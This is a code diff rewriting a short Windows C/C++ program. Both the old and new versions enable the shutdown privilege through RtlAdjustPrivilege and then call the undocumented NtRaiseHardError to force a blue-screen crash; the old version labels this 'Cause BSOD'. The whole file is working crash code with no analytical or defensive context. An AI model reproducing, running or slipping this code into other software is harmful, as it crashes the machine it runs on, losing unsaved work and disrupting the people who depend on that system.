@@ -1,32 +1,18 @@
-#include <windows.h>
-
-typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-
-typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
-    ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
-
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow)
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+using namespace std;
+typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+int main()
 {
-	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
-
-	if (hNtdll != 0)
-	{
-		NTSTATUS s1, s2;
-		BOOLEAN b;
-		ULONG r;
-		
-		//Enable shutdown privilege
-		//More https://msdn.microsoft.com/en-us/library/bb530716%28VS.85%29.aspx
-		
-		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
-		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
-		
-		//Cause BSOD
-		//More about NtRaiseHardError here http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html
-		
-		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
-		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
-	}
-	return 0;
+    BOOLEAN bEnabled;
+    ULONG uResp;
+    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
+    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
+    return 0;
 }
